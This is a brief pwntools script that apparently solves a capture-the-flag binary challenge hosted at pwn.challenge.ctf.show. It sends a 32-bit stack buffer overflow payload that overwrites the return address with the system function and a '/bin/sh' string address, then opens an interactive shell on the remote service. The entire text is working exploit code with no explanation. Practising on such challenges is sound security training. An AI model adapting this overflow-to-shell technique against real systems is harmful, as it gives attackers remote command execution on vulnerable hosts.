from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28161)
elf = ELF('./pwn')
system = elf.sym['system']
bin_sh = 0x8048750
payload = 'a'*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)
io.sendline(payload)
io.recv()
io.interactive()
